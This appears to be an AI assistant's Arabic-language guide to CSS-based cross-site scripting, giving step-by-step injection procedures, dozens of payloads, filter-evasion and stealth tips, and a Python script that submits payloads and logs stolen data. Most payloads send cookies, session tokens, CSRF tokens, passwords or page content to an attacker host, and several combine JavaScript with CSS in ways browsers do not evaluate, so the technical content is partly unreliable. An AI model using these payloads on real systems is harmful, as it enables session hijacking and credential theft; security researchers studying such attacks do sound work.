
## الخطوات العملية للحقن المستخدمة في XSS القائم على CSS
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات الصادرة الناتجة عن حقن CSS.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المرسلة عبر طلبات URL.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - حدد المتصفح المستهدف (مثل Internet Explorer لـ `expression()` أو متصفحات حديثة لتسريب البيانات).

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن نقاط إدخال تتيح إدخال أو عرض CSS، مثل:
     - حقول نصية تُعرض كنمط (مثل وصف الملف الشخصي أو التعليقات).
     - خصائص `style` في عناصر HTML (مثل `<div style="...">`).
     - تحميل ملفات CSS أو إدخال أنماط عبر API.
     - معلمات URL التي تُعرض كنمط أو تُحقن في CSS.
   - افحص استجابات الموقع (عبر Burp Suite أو عرض المصدر) لتحديد ما إذا كان يُسمح بخصائص CSS دون تنظيف.
   - تحقق من دعم المتصفح لخصائص أو تعبيرات CSS (مثل `expression()` في IE أو `content` في المتصفحات الحديثة).

3. **إدخال الحقن**:
   - أدخل شيفرة CSS تحتوي على خصائص أو تعبيرات ضارة في نقطة الإدخال العرضة.
   - صمم الحقنة لتنفيذ JavaScript أو تسريب بيانات، مثل:
     - `<div style="background-image:url('http://attacker.com/log?d='+document.cookie)">`
     - `<style>input[value="secret"] { background-image:url('http://attacker.com/log?value=secret'); }</style>`
   - جرب الحقن في سياقات مختلفة:
     - حقل نصي: أدخل `<div style="background-image:url('http://attacker.com/log')">` في وصف.
     - خاصية style: `<div style="expression(alert('XSS'))">` في Internet Explorer.
     - معلمة URL: `https://example.com/?style=body{background-image:url('http://attacker.com/log')}`
     - ملف CSS: أنشئ ملفًا بمحتوى `body { background-image:url('http://attacker.com/log'); }` وقم بتحميله.

4. **مراقبة الاستجابات**:
   - تحقق من تنفيذ الحقنة عبر:
     - **أدوات المطورين**: راقب وحدة التحكم (Console) للأخطاء أو التنبيهات (في حالة `expression()`).
     - **خادم خارجي**: تحقق من سجلات الخادم لتأكيد استلام البيانات (مثل قيم السمات أو ملفات تعريف الارتباط).
     - **تغييرات DOM**: تحقق من تغييرات التنسيق أو التفاعلات (مثل تغيير الخلفية).
   - **نجاح (True)**: البيانات تُرسل إلى الخادم أو يتم تنفيذ JavaScript.
   - **فشل (False)**: لا تُرسل بيانات أو لا يتم التنفيذ بسبب فلاتر أو CSP.
   - سجل النتائج لتحديد الحقن الناجحة.

5. **تجربة أنواع حقن مختلفة**:
   - إذا فشلت الحقنة، جرب أنواعًا أخرى:
     - استخدام خصائص CSS مختلفة: `background-image`، `content`، `list-style-image`.
     - استهداف سمات مختلفة: `value`، `data-*`، `id`، أو نصوص العناصر.
     - تجاوز الفلاتر: جرب صيغ بديلة مثل `background: url(...)` أو تعتيم الشيفرة.
   - اختبر نقاط إدخال متعددة (مثل حقول نصية أخرى، تحميل ملفات CSS، أو معلمات URL).
   - جرب حقنًا مع تقنيات تسريب بيانات متقدمة (مثل CSS selectors لاستخراج أحرف معينة).

6. **تأكيد السياق وتصعيد الاستغلال (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<div style="background-image:url('http://attacker.com/log?d='+document.domain)">`).
   - إذا نجحت الحقن، جرب هجمات متقدمة مثل:
     - استخراج بيانات حساسة (مثل رموز CSRF أو قيم `localStorage`).
     - تنفيذ إجراءات المستخدم (مثل محاكاة النقرات عبر تغييرات DOM).
     - تتبع التفاعلات (مثل تسجيل النصوص المُدخلة في حقول).
   - حافظ على التخفي بتجنب التغييرات البصرية الواضحة.

---

## جميع المحاولات الممكنة للحقن المستخدمة في XSS القائم على CSS
في الحقن المستخدمة في XSS القائم على CSS، المحاولات تركز على استغلال خصائص وتعبيرات CSS لتنفيذ JavaScript أو تسريب بيانات. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال CSS في حقول النماذج، معلمات URL، خصائص `style`، أو ملفات CSS. الهدف هو تنفيذ JavaScript أو تسريب بيانات.

#### أ. حقن باستخدام تعبير `expression()` (Internet Explorer)
استخدام `expression()` لتنفيذ JavaScript في المتصفحات القديمة (مثل IE).
- **الحقن**: `<div style="width:expression(alert('XSS'))">`
  - **الإدخال**: أدخل في حقل نصي: `<div style="width:expression(alert('XSS'))">`
  - **كيف يعمل**: ينفذ تنبيهًا عند عرض العنصر في IE.
  - **متى يُستخدم؟**: لاختبار المتصفحات القديمة.
- **الحقن**: `<div style="width:expression(fetch('http://attacker.com/log?c='+document.cookie))">`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<div style="width:expression(fetch('http://attacker.com/log?c='+document.cookie))">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم.
  - **متى يُستخدم؟**: لسرقة بيانات الجلسة في IE.
- **الحقن**: `<div style="width:expression(document.location='http://attacker.com')">`
  - **الإدخال**: `https://example.com/?style=div{width:expression(document.location='http://attacker.com')}`
  - **كيف يعمل**: يعيد توجيه المستخدم إلى موقع ضار.
  - **متى يُستخدم؟**: لإعادة التوجيه الخبيث.
- **الحقن**: `<div style="width:expression(fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML}))">`
  - **الإدخال**: أدخل في حقل تعليق: `<div style="width:expression(fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML}))">`
  - **كيف يعمل**: يرسل محتوى الصفحة إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.
- **الحقن**: `<div style="width:expression(new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'))">`
  - **الإدخال**: أدخل في وصف: `<div style="width:expression(new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'))">`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ب. حقن باستخدام `background-image` لتسريب البيانات
استخدام خاصية `background-image` لإرسال بيانات عبر URL.
- **الحقن**: `<div style="background-image:url('http://attacker.com/log')">`
  - **الإدخال**: أدخل في حقل نصي: `<div style="background-image:url('http://attacker.com/log')">`
  - **كيف يعمل**: يرسل طلبًا إلى خادم المهاجم لتأكيد التنفيذ.
  - **متى يُستخدم؟**: لتأكيد وجود ثغرة.
- **الحقن**: `<div style="background-image:url('http://attacker.com/log?d='+document.cookie)">`
  - **الإدخال**: `https://example.com/?style=div{background-image:url('http://attacker.com/log?d='+document.cookie)}`
  - **كيف يعمل**: يحاول إرسال ملفات تعريف الارتباط (قد يُحظر بسبب قيود المتصفح).
  - **متى يُستخدم؟**: لمحاولة سرقة البيانات.
- **الحقن**: `<div style="background-image:url('http://attacker.com/log?d='+document.domain)">`
  - **الإدخال**: أدخل في وصف: `<div style="background-image:url('http://attacker.com/log?d='+document.domain)">`
  - **كيف يعمل**: يرسل نطاق الصفحة إلى الخادم.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `<div style="background-image:url('http://attacker.com/log?l='+window.location.href)">`
  - **الإدخال**: أدخل في حقل تعليق: `<div style="background-image:url('http://attacker.com/log?l='+window.location.href)">`
  - **كيف يعمل**: يرسل عنوان URL الحالي.
  - **متى يُستخدم؟**: لتتبع الصفحة.
- **الحقن**: `<div style="background-image:url('http://attacker.com/log?s='+localStorage.getItem('token'))">`
  - **الإدخال**: أدخل في وصف: `<div style="background-image:url('http://attacker.com/log?s='+localStorage.getItem('token'))">`
  - **كيف يعمل**: يحاول إرسال رمز الجلسة (قد يتطلب دعم المتصفح).
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ج. تسريب البيانات باستخدام CSS Selectors
استخدام CSS selectors لاستخراج قيم السمات أو النصوص.
- **الحقن**: `<style>input[value="secret"] { background-image:url('http://attacker.com/log?value=secret'); }</style>`
  - **الإدخال**: أدخل في حقل نصي: `<style>input[value="secret"] { background-image:url('http://attacker.com/log?value=secret'); }</style>`
  - **كيف يعمل**: يرسل قيمة حقل الإدخال إذا كانت "secret".
  - **متى يُستخدم؟**: لاستخراج قيم محددة (مثل رموز CSRF).
- **الحقن**: `<style>[data-token="abc123"] { background-image:url('http://attacker.com/log?token=abc123'); }</style>`
  - **الإدخال**: أدخل في وصف: `<style>[data-token="abc123"] { background-image:url('http://attacker.com/log?token=abc123'); }</style>`
  - **كيف يعمل**: يرسل قيمة السمة `data-token` إذا كانت "abc123".
  - **متى يُستخدم؟**: لاستخراج سمات مخصصة.
- **الحقن**: `<style>input[value^="s"] { background-image:url('http://attacker.com/log?value=s'); }</style>`
  - **الإدخال**: `https://example.com/?style=input[value^="s"]{background-image:url('http://attacker.com/log?value=s')}`
  - **كيف يعمل**: يرسل أول حرف من قيمة الحقل إذا بدأ بـ "s".
  - **متى يُستخدم؟**: لتسريب أحرف تدريجيًا.
- **الحقن**: `<style>#csrf-token[value="xyz789"] { background-image:url('http://attacker.com/log?csrf=xyz789'); }</style>`
  - **الإدخال**: أدخل في حقل تعليق: `<style>#csrf-token[value="xyz789"] { background-image:url('http://attacker.com/log?csrf=xyz789'); }</style>`
  - **كيف يعمل**: يرسل قيمة رمز CSRF إذا كانت "xyz789".
  - **متى يُستخدم؟**: لسرقة رموز CSRF.
- **الحقن**: `<style>input[type="password"] { background-image:url('http://attacker.com/log?pass='+this.value); }</style>`
  - **الإدخال**: أدخل في وصف: `<style>input[type="password"] { background-image:url('http://attacker.com/log?pass='+this.value); }</style>`
  - **كيف يعمل**: يحاول إرسال قيمة حقل كلمة المرور (قد يُحظر).
  - **متى يُستخدم؟**: لمحاولة تسريب كلمات المرور.

#### د. حقن باستخدام خاصية `content`
استخدام `content` لتسريب نصوص أو سمات.
- **الحقن**: `<style>p::after { content: attr(data-secret); background-image:url('http://attacker.com/log?s='+attr(data-secret)); }</style>`
  - **الإدخال**: أدخل في حقل نصي: `<style>p::after { content: attr(data-secret); background-image:url('http://attacker.com/log?s='+attr(data-secret)); }</style>`
  - **كيف يعمل**: يحاول إرسال قيمة السمة `data-secret`.
  - **متى يُستخدم؟**: لتسريب سمات العناصر.
- **الحقن**: `<style>div::before { content: attr(id); background-image:url('http://attacker.com/log?id='+attr(id)); }</style>`
  - **الإدخال**: أدخل في وصف: `<style>div::before { content: attr(id); background-image:url('http://attacker.com/log?id='+attr(id)); }</style>`
  - **كيف يعمل**: يرسل قيمة معرف العنصر.
  - **متى يُستخدم؟**: لتسريب معرفات العناصر.
- **الحقن**: `<style>input::after { content: attr(value); background-image:url('http://attacker.com/log?value='+attr(value)); }</style>`
  - **الإدخال**: `https://example.com/?style=input::after{content:attr(value);background-image:url('http://attacker.com/log?value='+attr(value))}`
  - **كيف يعمل**: يحاول إرسال قيمة حقل الإدخال.
  - **متى يُستخدم؟**: لتسريب قيم النماذج.
- **الحقن**: `<style>p::after { content: 'secret'; background-image:url('http://attacker.com/log?text=secret'); }</style>`
  - **الإدخال**: أدخل في حقل تعليق: `<style>p::after { content: 'secret'; background-image:url('http://attacker.com/log?text=secret'); }</style>`
  - **كيف يعمل**: يرسل نصًا ثابتًا إذا كان موجودًا.
  - **متى يُستخدم؟**: لتأكيد وجود نص معين.
- **الحقن**: `<style>[data-token]::after { content: attr(data-token); background-image:url('http://attacker.com/log?token='+attr(data-token)); }</style>`
  - **الإدخال**: أدخل في وصف: `<style>[data-token]::after { content: attr(data-token); background-image:url('http://attacker.com/log?token='+attr(data-token)); }</style>`
  - **كيف يعمل**: يرسل قيمة السمة `data-token`.
  - **متى يُستخدم؟**: لتسريب بيانات مخصصة.

#### هـ. حقن مع التعتيم
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<div style="width:expression(eval(atob('YWxlcnQoJ1hTUycp')))">`
  - **الإدخال**: أدخل في حقل نصي: `<div style="width:expression(eval(atob('YWxlcnQoJ1hTUycp')))">`
  - **كيف يعمل**: يفك تشفير Base64 لتنفيذ تنبيه.
  - **متى يُستخدم؟**: لتجاوز فلاتر WAF في IE.
- **الحقن**: `<style>input[value="secret"] { background-image:url(//attacker.com/log?value=secret); }</style>`
  - **الإدخال**: أدخل في وصف: `<style>input[value="secret"] { background-image:url(//attacker.com/log?value=secret); }</style>`
  - **كيف يعمل**: يستخدم صيغة URL مختصرة لتسريب القيمة.
  - **متى يُستخدم؟**: لتجنب فلاتر URL.
- **الحقن**: `<div style="background: url('http://attacker.com/log?d='+String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))">`
  - **الإدخال**: أدخل في حقل تعليق: `<div style="background: url('http://attacker.com/log?d='+String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))">`
  - **كيف يعمل**: يستخدم رموز ASCII لتسريب النطاق.
  - **متى يُستخدم؟**: لتجاوز فلاتر البحث عن الكلمات.
- **الحقن**: `<style>input[value^="s"] { background-image:url('http://attacker.com/log?value='+encodeURIComponent('s')); }</style>`
  - **الإدخال**: `https://example.com/?style=input[value^="s"]{background-image:url('http://attacker.com/log?value='+encodeURIComponent('s'))}`
  - **كيف يعمل**: يشفر القيمة لتجنب أخطاء URL.
  - **متى يُستخدم؟**: لتجنب مشكلات التنسيق.
- **الحقن**: `<div style="width:expression(setTimeout('alert(\"XSS\")',1000))">`
  - **الإدخال**: أدخل في وصف: `<div style="width:expression(setTimeout('alert(\"XSS\")',1000))">`
  - **كيف يعمل**: يؤخر تنفيذ التنبيه لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب أنظمة المراقبة الفورية.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests` أو `selenium`) لأتمتة اختبار مجموعة من الحقن المستخدمة في XSS القائم على CSS وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تستخدم خصائص وتعبيرات CSS.
  - مثال قائمة:
    ```
    <div style="background-image:url('http://attacker.com/log?d='+document.domain)">
    <style>input[value="secret"] { background-image:url('http://attacker.com/log?value=secret'); }</style>
    <div style="width:expression(alert('XSS'))">
    <style>[data-token="abc123"] { background-image:url('http://attacker.com/log?token=abc123'); }</style>
    <style>p::after { content: attr(data-secret); background-image:url('http://attacker.com/log?s='+attr(data-secret)); }</style>
    ```
- **كيف يعمل**:
  - يتم إرسال الحقن عبر نقاط إدخال (مثل حقول نصية، معلمات URL، أو ملفات CSS).
  - يتم مراقبة الخادم الخارجي لتأكيد استلام البيانات.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع خادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse
  import requests

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<div style=\"background-image:url('http://localhost:8000/log?d='+document.domain)\">",
      "<style>input[value=\"secret\"] { background-image:url('http://localhost:8000/log?value=secret'); }</style>",
      "<div style=\"width:expression(alert('XSS'))\">",
      "<style>[data-token=\"abc123\"] { background-image:url('http://localhost:8000/log?token=abc123'); }</style>",
      "<style>p::after { content: attr(data-secret); background-image:url('http://localhost:8000/log?s='+attr(data-secret)); }</style>"
  ]

  target_url = "https://example.com/submit-style"
  for payload in payloads:
      try:
          requests.post(target_url, data={"style": payload})
          print(f"تم إرسال: {payload}")
      except:
          print(f"فشل إرسال: {payload}")
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُرسل الحقن إلى نقطة إدخال (مثل حقل نمط) عبر طلب POST.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لنقاط إدخال متعددة.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن البيانات المستلمة في الخادم:
    - **قيم السمات**: تحقق من قيم مثل `value=secret` أو `token=abc123`.
    - **سياق التنفيذ**: تحقق من بيانات مثل النطاق أو عنوان URL.
    - **تنفيذ JavaScript**: تحقق من تنبيهات أو أخطاء في وحدة التحكم (في IE).
  - مثال: إذا تلقى الخادم `value=secret`， فهذا يؤكد نجاح تسريب قيمة الحقل.
- **كيف يعمل**:
  - يتم تسجيل البيانات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد السياقات القابلة للاستغلال.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<style>input:focus { background-image:url('http://attacker.com/log?focus=1'); }</style>`).
  - جرب خصائص CSS أخرى (مثل `list-style-image`، `border-image`).
  - اختبر تسريب أحرف تدريجيًا باستخدام selectors مثل `[value^="a"]`، `[value^="b"]`، إلخ.
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<style>input[value$="z"] { background-image:url('http://attacker.com/log?value=z'); }</style>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. حقن باستخدام تعبير expression() (Internet Explorer):
- <div style="width:expression(alert('XSS'))">: ينفذ تنبيهًا في IE.
- <div style="width:expression(fetch('http://attacker.com/log?c='+document.cookie))">: يرسل ملفات تعريف الارتباط.
- <div style="width:expression(document.location='http://attacker.com')">: يعيد توجيه المستخدم.
- <div style="width:expression(fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML}))">: يرسل محتوى الصفحة.
- <div style="width:expression(new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'))">: يرسل رمز الجلسة.

2. حقن باستخدام background-image لتسريب البيانات:
- <div style="background-image:url('http://attacker.com/log')">: يرسل طلبًا لتأكيد التنفيذ.
- <div style="background-image:url('http://attacker.com/log?d='+document.cookie)">: يحاول إرسال ملفات تعريف الارتباط.
- <div style="background-image:url('http://attacker.com/log?d='+document.domain)">: يرسل نطاق الصفحة.
- <div style="background-image:url('http://attacker.com/log?l='+window.location.href)">: يرسل عنوان URL الحالي.
- <div style="background-image:url('http://attacker.com/log?s='+localStorage.getItem('token'))">: يحاول إرسال رمز الجلسة.

3. تسريب البيانات باستخدام CSS Selectors:
- <style>input[value="secret"] { background-image:url('http://attacker.com/log?value=secret'); }</style>: يرسل قيمة حقل الإدخال.
- <style>[data-token="abc123"] { background-image:url('http://attacker.com/log?token=abc123'); }</style>: يرسل قيمة السمة data-token.
- <style>input[value^="s"] { background-image:url('http://attacker.com/log?value=s'); }</style>: يرسل أول حرف من القيمة.
- <style>#csrf-token[value="xyz789"] { background-image:url('http://attacker.com/log?csrf=xyz789'); }</style>: يرسل رمز CSRF.
- <style>input[type="password"] { background-image:url('http://attacker.com/log?pass='+this.value); }</style>: يحاول إرسال كلمة المرور.

4. حقن باستخدام خاصية content:
- <style>p::after { content: attr(data-secret); background-image:url('http://attacker.com/log?s='+attr(data-secret)); }</style>: يحاول إرسال قيمة data-secret.
- <style>div::before { content: attr(id); background-image:url('http://attacker.com/log?id='+attr(id)); }</style>: يرسل معرف العنصر.
- <style>input::after { content: attr(value); background-image:url('http://attacker.com/log?value='+attr(value)); }</style>: يحاول إرسال قيمة الحقل.
- <style>p::after { content: 'secret'; background-image:url('http://attacker.com/log?text=secret'); }</style>: يرسل نصًا ثابتًا.
- <style>[data-token]::after { content: attr(data-token); background-image:url('http://attacker.com/log?token='+attr(data-token)); }</style>: يرسل قيمة data-token.

5. حقن مع التعتيم:
- <div style="width:expression(eval(atob('YWxlcnQoJ1hTUycp')))">: يفك تشفير Base64 لتنفيذ تنبيه.
- <style>input[value="secret"] { background-image:url(//attacker.com/log?value=secret); }</style>: يستخدم صيغة URL مختصرة.
- <div style="background: url('http://attacker.com/log?d='+String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))">: يستخدم رموز ASCII.
- <style>input[value^="s"] { background-image:url('http://attacker.com/log?value='+encodeURIComponent('s')); }</style>: يشفر القيمة.
- <div style="width:expression(setTimeout('alert(\"XSS\")',1000))">: يؤخر تنفيذ التنبيه.



---

**نصائح إضافية**:
- **اختبار توافق المتصفح**: ركز على Internet Explorer لـ `expression()` والمتصفحات الحديثة (Chrome، Firefox) لتسريب البيانات عبر `background-image` أو selectors.
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو `ngrok` لتسجيل البيانات، وتأكد من دعم طلبات GET.
- **تجاوز الفلاتر**: جرب تغيير حالة الأحرف (مثل `BACKGROUND-IMAGE`)، استخدام خصائص غير شائعة (مثل `border-image`)، أو تعتيم الشيفرة.
- **اختبار نقاط الإدخال**: ركز على حقول النصوص، خصائص `style`، تحميل ملفات CSS، ومعلمات URL التي تُعرض كنمط.
- **الأدوات**: استخدم **Burp Suite** لمراقبة الطلبات، **XSStrike** لتوليد الحقن، أو **Selenium** لمحاكاة التفاعل مع الحقن.
- **القيود**: تذكر أن بعض الحقن (مثل تسريب `document.cookie` عبر `background-image`) قد تُحظر بسبب قيود المتصفح الحديث أو CSP.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Stored XSS Payloads" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل CSS XSS في تطبيقات معينة)، أخبرني وسأقدم ردًا مخصصًا!